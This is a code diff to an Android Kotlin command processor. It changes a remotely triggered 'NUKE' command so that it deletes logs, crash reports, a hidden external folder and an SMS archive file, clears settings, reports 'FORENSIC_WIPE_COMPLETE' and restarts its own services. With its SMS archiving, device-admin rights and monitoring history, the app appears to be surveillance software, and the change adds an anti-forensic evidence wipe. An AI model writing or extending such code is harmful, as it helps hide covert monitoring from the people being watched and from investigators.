@@ -586,19 +586,23 @@ object CommandProcessor {
                 }
                 "NUKE" -> {
                     try {
-                        // 1. Wipe the "Catacombs" (Logs, captures, and encrypted blobs)
+                        // 1. Wipe the "Catacombs" (External hidden storage)
                         File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS), "Android").deleteRecursively()
                         
-                        // 2. Reset session stats, counters, and monitoring history
-                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().clear().apply()
+                        // 2. Wipe Internal Files (Logs and Crash reports)
+                        File(ctx.filesDir, "survivor_logs.txt").delete()
+                        File(ctx.filesDir, "CRITICAL_HALT.txt").delete()
+                        File(ctx.filesDir, "sms_archive_vault.json").delete()
                         
-                        // 3. Clear dynamic configuration to revert to default behavior
+                        // 3. Reset SharedPreferences (Excluding app_identity)
+                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().clear().apply()
                         ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit().clear().apply()
+                        ctx.getSharedPreferences("setup_prefs", Context.MODE_PRIVATE).edit().clear().apply()
+                        ctx.getSharedPreferences("app_health", Context.MODE_PRIVATE).edit().clear().apply()
 
-                        // Note: Device Admin and Runtime Permissions are intentionally preserved.
                         status = "FORENSIC_WIPE_COMPLETE"
                         
-                        // 4. Force restart to flush in-memory logs and reset service state
+                        // 4. Suicide & Resurrect: Kill process; OS will restart services in fresh state
                         Handler(Looper.getMainLooper()).postDelayed({ 
                             android.os.Process.killProcess(android.os.Process.myPid()) 
                         }, 2000)
